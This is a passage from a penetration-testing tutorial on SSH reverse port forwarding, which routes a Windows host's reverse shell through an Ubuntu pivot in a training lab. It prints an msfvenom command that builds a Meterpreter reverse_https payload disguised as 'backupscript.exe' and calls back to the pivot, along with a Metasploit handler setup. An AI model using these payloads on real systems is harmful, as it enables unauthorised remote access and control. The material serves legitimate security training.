# Remote/Reverse Port Forwarding with SSH

We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host `Windows A`. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.

But what happens if we try to gain a reverse shell?

The `outgoing connection` for the Windows host is only limited to the `172.16.5.0/23` network. This is because the Windows host does not have any direct connection with the network the attack host is on. If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).

There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to `upload`/`download` files (when the RDP clipboard is disabled), `use exploits` or `low-level Windows API` using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in [Windows executables](https://lolbas-project.github.io/).

In these cases, we would have to find a pivot host, which is a common connection point between our attack host and the Windows server. In our case, our pivot host would be the Ubuntu server since it can connect to both: `our attack host` and `the Windows target`. To gain a `Meterpreter shell` on Windows, we will create a Meterpreter HTTPS payload using `msfvenom`, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (`172.16.5.129`). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.

### **Creating a Windows Payload with msfvenom**

```shell-session
al1abb@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

### **Configuring & Starting the multi/handler**

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```
